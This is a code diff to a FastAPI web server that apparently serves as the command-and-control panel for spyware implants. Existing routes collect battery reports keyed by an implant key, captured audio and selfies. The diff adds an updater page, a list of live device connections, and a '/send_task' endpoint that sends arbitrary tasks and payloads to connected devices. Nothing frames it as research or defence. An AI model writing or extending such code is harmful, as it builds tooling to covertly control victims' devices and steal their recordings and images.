@@ -632,7 +632,7 @@ app.add_middleware(
 )
 
 # Mount public static assets.
-app.mount("/static", StaticFiles(directory="static"), name="static")
+app.mount("/static", StaticFiles(directory=os.path.join(BASE_DIR, "static")), name="static")
 
 @app.get("/media/audio/{filename}")
 async def protected_audio(filename: str, request: Request):
@@ -721,6 +721,14 @@ async def selfies_view(request: Request):
         return RedirectResponse(url="/login")
     return FileResponse("templates/selfies.html", media_type="text/html")
 
+@app.get("/updater_view", response_class=FileResponse)
+async def updater_view(request: Request):
+    try:
+        verify_session(request)
+    except HTTPException:
+        return RedirectResponse(url="/login")
+    return FileResponse("templates/updater.html", media_type="text/html")
+
 @app.post("/battery_report")
 async def receive_report(
     implant_key: str = Form(...),
@@ -803,6 +811,29 @@ async def get_devices(request: Request, db: sqlite3.Connection = Depends(get_db)
     c.execute("SELECT device_id FROM devices ORDER BY device_id ASC")
     rows = c.fetchall()
     return {"devices": [r["device_id"] for r in rows]}
+
+@app.get("/active_connections")
+async def get_active_connections(request: Request):
+    verify_session(request)
+    async with ws_manager.lock:
+        connections = list(ws_manager.active_connections.keys())
+    return {"connections": connections}
+
+@app.post("/send_task")
+async def send_task(device_id: str = Form(...), task: str = Form(...), payload: str = Form("{}"), request: Request = Depends(verify_session)):
+    if device_id not in ws_manager.active_connections:
+        return JSONResponse({"status": "offline", "message": "Connection not active"}, status_code=404)
+
+    data = {"task": task}
+    try:
+        extra = json.loads(payload or "{}")
+        if isinstance(extra, dict):
+            data.update(extra)
+    except Exception:
+        pass
+
+    await ws_manager.send_task(device_id, data)
+    return {"status": "sent", "task": data}
 
 @app.get("/check_commands")
 async def check_commands(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
